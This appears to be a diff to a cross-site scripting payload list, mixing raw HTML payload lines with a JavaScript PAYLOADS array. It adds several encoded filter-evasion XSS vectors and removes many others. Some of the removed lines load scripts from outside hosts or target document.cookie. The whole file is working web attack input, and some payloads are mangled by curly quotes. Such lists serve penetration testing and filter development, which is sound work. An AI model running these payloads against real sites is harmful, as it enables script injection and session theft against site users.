@@ -1,3 +1,8 @@
+<<SCRIPT>alert("XSS");//\<</SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> // Hex HTML
+<IMG SRC="jav&#x09;ascript:alert('XSS');"> // Embedded encoded tab
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
 const PAYLOADS = [
     {
@@ -120,19 +125,6 @@ const PAYLOADS = [
 <script>alert(“XSS”);</script>
 <script>alert(‘XSS’)</script>
 “><script>alert(“XSS”)</script>
-<script>alert(/XSS”)</script>
-<script>alert(/XSS/)</script>
-</script><script>alert(1)</script>
-‘; alert(1);
-‘)alert(1);//
-<ScRiPt>alert(1)</sCriPt>
-<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
-<IMG SRC=”javascript:alert(‘XSS’);”>
-<IMG SRC=javascript:alert(&quot;XSS&quot;)>
-<IMG SRC=javascript:alert(‘XSS’)>      
-<img src=xss onerror=alert(1)>
-
-
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
 
 <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
@@ -211,28 +203,6 @@ http://www.google<script .com>alert(document.location)</script
 &#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
 
 <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
-
-<div/style="width:expression(confirm(1))">X</div> {IE7}
-
-<iframe/%00/ src=javaSCRIPT&colon;alert(1)
-
-//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
-
-/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
-
-//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
-
-</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
-
-<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
-
-</plaintext\></|\><plaintext/onmouseover=prompt(1)
-
-</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
-
-<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
-
-<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
 
 <iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
 
@@ -320,49 +290,10 @@ http://www.<script>alert(1)</script .com
 
 <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
 
-<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
-
-<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
-‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>
-<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
-<IMG SRC=”jav ascript:alert(‘XSS’);”>
-<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>
-<<SCRIPT>alert(“XSS”);//<</SCRIPT>
-%253cscript%253ealert(1)%253c/script%253e
-“><s”%2b”cript>alert(document.cookie)</script>
-foo<script>alert(1)</script>
-<scr<script>ipt>alert(1)</scr</script>ipt>
-<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
-<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
-<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
-<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
-<BODY ONLOAD=alert(‘XSS’)>
-<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>
-<IMG SRC=”javascript:alert(‘XSS’)”
-<iframe src=http://ha.ckers.org/scriptlet.html <
 javascript:alert("hellox worldss")
 <img src="javascript:alert('XSS');">
 <img src=javascript:alert(&quot;XSS&quot;)>
 <"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<<SCRIPT>alert("XSS");//<</SCRIPT>
-<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
-<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
-<script>alert("XSS");</script>&search=1
-0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
-<h1><font color=blue>hellox worldss</h1>
-<BODY ONLOAD=alert('hellox worldss')>
-<input onfocus=write(XSS) autofocus>
-<input onblur=write(XSS) autofocus><input autofocus>
 <body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
 <form><button formaction="javascript:alert(XSS)">lol
 <!--<img src="--><img src=x onerror=alert(XSS)//">
